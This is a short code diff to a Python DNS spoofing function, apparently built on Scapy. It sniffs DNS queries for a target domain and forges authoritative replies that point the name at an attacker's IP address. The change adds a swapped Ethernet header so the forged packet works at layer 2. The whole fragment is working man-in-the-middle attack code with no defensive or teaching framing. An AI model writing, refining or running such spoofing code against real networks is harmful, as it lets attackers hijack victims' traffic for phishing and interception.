@@ -64,7 +64,8 @@ def dns_spoof(pkt):
         if target_domain in pkt[DNS].qd.qname.decode():
             print(f"Spoofing DNS request for {target_domain}")
             # Construct the DNS response
-            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+            spoofed_pkt = Ether(src=pkt[Ether].dst,dst=pkt[Ether].src) / \
+                          IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                           UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                           DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                               an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=attacker_ip))
